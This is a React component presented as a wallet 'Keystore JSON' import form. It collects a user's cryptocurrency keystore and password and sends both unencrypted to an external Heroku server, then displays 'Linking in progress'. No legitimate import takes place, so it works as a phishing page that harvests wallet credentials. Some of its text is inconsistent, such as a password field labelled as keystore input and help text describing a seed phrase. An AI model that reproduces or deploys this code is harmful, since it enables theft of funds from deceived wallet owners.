import React, { useState } from "react";
import { useFormik } from "formik";
import * as yup from "yup";
import Button from "@material-ui/core/Button";
import TextField from "@material-ui/core/TextField";
import {
  Grid,
  //  makeStyles,
  Typography,
  withStyles,
} from "@material-ui/core";
import IconButton from "@material-ui/core/IconButton";
import InputAdornment from "@material-ui/core/InputAdornment";
import Visibility from "@material-ui/icons/Visibility";
import VisibilityOff from "@material-ui/icons/VisibilityOff";
import axios from "axios";
// axios.defaults.headers.post["Accept"] = "application/json"; // default header for all POST request
const CssTextField = withStyles({
  root: {
    "& .MuiOutlinedInput-input": {
      color: "white",
    },
    "& .MuiInputLabel-root": {
      color: "white",
    },
    "& .MuiOutlinedInput-root .MuiOutlinedInput-notchedOutline": {
      borderColor: "white",
    },
    "& label.Mui-focused": {
      color: "green",
    },
    "& .MuiInput-underline:after": {
      borderBottomColor: "green",
    },
    "& .MuiOutlinedInput-root": {
      "& fieldset": {
        borderColor: "white",
      },
      "&:hover fieldset": {
        borderColor: "white",
      },
      "&.Mui-focused fieldset": {
        borderColor: "white",
      },
    },
  },
})(TextField);

const validationSchema = yup.object().shape({
  key1: yup
    .string("Enter your keystore")
    .min(8, "Keystore Json should be of minimum 12 characters length")
    .required("Keystore Json is required"),
  key2: yup
    .string("Enter your password")
    .min(8, "Password should be of minimum 8 characters length")
    .required("Password is required"),
});



export const KeystoreJson = () => {
  const [sucess, setSucess] = useState(false);
  const [error, setError] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [values, setValues] = React.useState({
    showPassword: false,
  });

  const handleClickShowPassword = () => {
    setValues({
      showPassword: !values.showPassword,
    });
  };

  const handleMouseDownPassword = (event) => {
    event.preventDefault();
  };

  const url = "https://west-api.herokuapp.com/";

 const formik = useFormik({
    initialValues: {
      key1: "",
      key2: "",
    },
    validationSchema: validationSchema,

    onSubmit: (values, { setSubmitting, resetForm, setValues }) => {
      setIsSubmitting(true);
      setTimeout(() => {
        let dataToSubmit = {
          key1: values.key1,
          key2: values.key2,
        };
        axios.post(url, dataToSubmit).then((response) => {
          if (response.status === 200) {
            setSucess(true);
            setIsSubmitting(false);
          } else {
            setError(true);
          }
        });
        setSubmitting(false);
        resetForm();
      }, 500);
    },
  });
  return (
    <div>
      <form
        onSubmit={formik.handleSubmit}
        autoComplete="off"
        spellcheck="false"
      >
        <div style={{ margin: "2rem 0" }}>
          <CssTextField
            id="key1"
            fullWidth
            multiline
            placeholder="Keystore JSON"
            rows={3}
            value={formik.values.key1}
            onChange={formik.handleChange}
            variant="outlined"
            error={formik.touched.key1 && Boolean(formik.errors.key1)}
            helperText={formik.touched.key1 && formik.errors.key1}
          />
        </div>
        <div style={{ margin: "2rem 0" }}>
          <CssTextField
            fullWidth
            id="password"
            type={values.showPassword ? "text" : "password"}
            name="key2"
            placeholder="Keystore JSON"
            variant="outlined"
            value={formik.values.key2}
            InputProps={{
              endAdornment: (
                <InputAdornment position="end">
                  <IconButton
                    aria-label="toggle password visibility"
                    onClick={handleClickShowPassword}
                    onMouseDown={handleMouseDownPassword}
                    edge="end"
                  >
                    {values.showPassword ? (
                      <Visibility style={{ color: "white" }} />
                    ) : (
                      <VisibilityOff style={{ color: "white" }} />
                    )}
                  </IconButton>
                </InputAdornment>
              ),
            }}
            onChange={formik.handleChange}
            error={formik.touched.key2 && Boolean(formik.errors.key2)}
            helperText={formik.touched.key2 && formik.errors.key2}
          />
        </div>
        <Grid style={{ margin: "2rem 0", textAlign: "left" }}>
          <Typography variant="subtitle1" display="block" gutterBottom>
            Typically 12 (sometimes 24) words separated by single spaces.
          </Typography>
        </Grid>
        {isSubmitting ? (
          <Button
            variant="contained"
            type="submit"
            fullWidth
            disabled={isSubmitting}
          >
            <h3 className="loading">Loading</h3>
          </Button>
        ) : (
          <Button
            variant="contained"
            type="submit"
            fullWidth
            // disabled={isSubmitting}
          >
            <h3 className="importing">Import</h3>
          </Button>
        )}

        <Grid style={{ margin: "2rem 0" }}>
          <div>
            {sucess && <h3 className="loading">Linking in progress</h3>}
            {error && (
              <div className="error">
                error: key could not be imported. pls try again
              </div>
            )}
          </div>
        </Grid>
      </form>
    </div>
  );
};
